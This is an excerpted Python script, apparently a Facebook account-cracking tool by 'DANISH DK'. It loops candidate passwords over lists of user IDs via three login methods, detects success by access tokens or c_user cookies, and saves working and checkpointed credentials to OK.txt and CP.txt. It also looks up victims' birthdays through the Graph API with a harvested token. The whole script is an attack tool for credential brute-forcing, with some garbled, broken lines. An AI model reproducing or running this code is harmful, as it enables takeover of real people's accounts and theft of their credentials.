...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#DANISH_DK('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = DANISH(self.apk).read().splitlines()
			DANISH_DK(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							DANISH_DK('[•] Result CP saved to CP.txt')
							DANISH_DK('\n\tCrack Processing...\n')
							DANISH_DK('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					DANISH_DK('\n01.) Metode b-api ')
					DANISH_DK('02.) Metode mbasic ')
					DANISH_DK('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			DANISH_DK('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			DANISH_DK(' [1] DK Method 1 ')
			DANISH_DK(' [2] DK Method 2  [ Pro ]')
			DANISH_DK(' [3] DK Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [DK] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				ua_xiaomi = DANISH('agent.txt', 'r').read()
			...
			if "access_token" in p:
				DANISH_DK('\r\033[1;92m[Successful-DK] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = DANISH('login.txt').read()
					cp_ttl = Prof_Danish('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					DANISH_DK('\r\033[1;91m[Checkpoint-DK] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				DANISH_DK('\r\033[1;91m[Checkpoint-DK] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				DANISH_DK('\r\033[1;32m[Successful-DK] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = DANISH('token.txt').read()
					cp_ttl = Prof_Danish('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].DANISH_DK('\r\033[1;91m[Checkpoint-DK] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				DANISH_DK('\r\033[1;92m[Successful-DK] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					pass
				DANISH_DK('\r\033[1;91m[Checkpoint-DANISH_DK] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
...
`-------' `--' `--'`--'  `--'`--'`-----' `--'  `--'    `-------' `--' '--' 
 ...
 [*]=============================================
    Author   : DANISH DK
    Facebook : https://www.facebook.com/profile.php?id=100000719963602
    Team     : CHORI KA MAWL
    Connect  : +48699542281
 [*]=============================================
